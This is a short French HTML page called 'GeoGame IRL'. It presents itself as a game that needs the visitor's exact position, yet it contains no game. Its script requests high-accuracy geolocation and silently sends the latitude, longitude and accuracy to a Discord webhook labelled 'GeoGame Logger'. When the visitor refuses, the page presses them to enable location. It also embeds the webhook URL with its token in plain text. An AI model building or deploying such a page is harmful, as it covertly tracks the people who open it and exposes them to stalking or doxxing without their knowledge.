<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>GeoGame IRL</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: #eef2f5;
        margin: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    #container {
        background: white;
        padding: 30px;
        width: 90%;
        max-width: 400px;
        border-radius: 12px;
        box-shadow: 0 6px 20px rgba(0,0,0,0.15);
        text-align: center;
    }

    button {
        background: #0066ff;
        border: none;
        padding: 15px 25px;
        color: white;
        border-radius: 10px;
        cursor: pointer;
        font-size: 18px;
        margin-top: 20px;
        transition: 0.2s;
        width: 100%;
    }

    button:hover {
        background: #004fcc;
    }
</style>
</head>
<body>

<div id="container">
    <h2>üìç GeoGame IRL</h2>
    <p>
        Pour jouer, nous avons besoin de votre position exacte.<br>
        Cliquez sur le bouton ci-dessous.
    </p>
    <button id="locate">Demander la localisation</button>

    <p id="errorMsg" style="color:red; font-weight:bold; display:none; margin-top:15px;"></p>
</div>

<script>
document.getElementById("locate").addEventListener("click", () => {

    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = pos.coords.accuracy;

            alert(`‚úî Position obtenue :
Latitude : ${lat}
Longitude : ${lon}
Pr√©cision : ${acc} m√®tres`);

            // ---- Envoi au webhook ----
            fetch("https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "GeoGame Logger",
                    content: "Nouveau joueur avec localisation",
                    embeds: [{
                        title: "Localisation exacte",
                        description: `Latitude : ${lat}\nLongitude : ${lon}\nPr√©cision : ${acc} m`,
                        color: 0x00ff99
                    }]
                })
            });

        },
        (err) => {
            const errorMessage = document.getElementById("errorMsg");
            errorMessage.style.display = "block";

            if (err.code === 1) {
                errorMessage.innerHTML = `
‚ö†Ô∏è Vous avez refus√© la g√©olocalisation.<br><br>
Veuillez autoriser la localisation dans les r√©glages de votre navigateur / t√©l√©phone pour jouer.
                `;
            } 
            else {
                errorMessage.innerHTML = "Impossible d'obtenir votre position.";
            }

            console.log("Erreur :", err);
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );

});
</script>

</body>
</html>

